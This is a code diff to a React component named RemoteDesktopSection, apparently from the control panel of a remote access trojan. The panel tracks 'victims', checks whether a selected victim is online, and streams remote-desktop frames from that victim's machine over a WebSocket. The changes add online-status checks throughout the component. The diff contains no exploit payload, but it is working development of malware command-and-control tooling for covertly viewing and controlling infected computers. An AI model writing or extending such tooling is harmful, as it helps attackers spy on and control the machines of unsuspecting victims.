@@ -1,14 +1,18 @@
 "use client";
 
 import { useEffect } from "react";
+import { useQueryClient } from "@tanstack/react-query";
 
 import { usePanelDetailView } from "../panel-detail-view-provider";
 import { usePanelWS } from "../../../ws/ws-provider";
 import { showToast } from "../../../toast";
+import type { Victim } from "../../../api/victims";
+import { isVictimOnline } from "../../utils/victim-status";
 
 export function RemoteDesktopSection() {
    const detail = usePanelDetailView();
    const ws = usePanelWS();
+   const qc = useQueryClient();
 
    useEffect(() => {
       const loader = document.getElementById("remoteDesktopLoader");
@@ -48,7 +52,19 @@ export function RemoteDesktopSection() {
       const unRes = syncSlider(resSlider, resValue);
 
       const applyUi = () => {
-         const connected = ws.state === "open" && !!detail.selectedVictimId;
+         const connected = (() => {
+            if (ws.state !== "open") return false;
+            const victimId = detail.selectedVictimId;
+            if (!victimId) return false;
+            try {
+               const data = qc.getQueryData(["victims"]);
+               const list = Array.isArray(data) ? (data as Victim[]) : [];
+               const v = list.find((x) => String((x as { id?: unknown }).id ?? "") === String(victimId));
+               return !!(v && isVictimOnline(v));
+            } catch {
+               return false;
+            }
+         })();
          const showLoader = !connected || !isLoaded;
 
          loader.style.display = showLoader ? "block" : "none";
@@ -66,7 +82,19 @@ export function RemoteDesktopSection() {
       };
 
       const startLoad = () => {
-         const connected = ws.state === "open" && !!detail.selectedVictimId;
+         const connected = (() => {
+            if (ws.state !== "open") return false;
+            const victimId = detail.selectedVictimId;
+            if (!victimId) return false;
+            try {
+               const data = qc.getQueryData(["victims"]);
+               const list = Array.isArray(data) ? (data as Victim[]) : [];
+               const v = list.find((x) => String((x as { id?: unknown }).id ?? "") === String(victimId));
+               return !!(v && isVictimOnline(v));
+            } catch {
+               return false;
+            }
+         })();
          if (!connected) {
             isLoaded = false;
             applyUi();
@@ -94,6 +122,16 @@ export function RemoteDesktopSection() {
          if (!victimId) {
             showToast("error", "Select victim first");
             return;
+         }
+         try {
+            const data = qc.getQueryData(["victims"]);
+            const list = Array.isArray(data) ? (data as Victim[]) : [];
+            const v = list.find((x) => String((x as { id?: unknown }).id ?? "") === String(victimId));
+            if (v && !isVictimOnline(v)) {
+               showToast("error", "Victim offline");
+               return;
+            }
+         } catch {
          }
          if (ws.state !== "open") {
             showToast("error", "WebSocket is not connected");
@@ -131,6 +169,14 @@ export function RemoteDesktopSection() {
       const onWsMsg = (ev: CustomEvent<Record<string, unknown>>) => {
          const msg = (ev && ev.detail ? ev.detail : {}) as Record<string, unknown>;
          const t = typeof msg.type === "string" ? msg.type : "";
+         if (t === "victims" || t === "update") {
+            try {
+               startLoad();
+               applyUi();
+            } catch {
+            }
+            return;
+         }
          if (t !== "rd_frame") return;
 
          const victId = (() => {
@@ -181,7 +227,7 @@ export function RemoteDesktopSection() {
          } catch {
          }
       };
-   }, [detail.selectedVictimId, ws]);
+   }, [detail.selectedVictimId, qc, ws]);
 
    return (
       <div className="detail-section h-full">
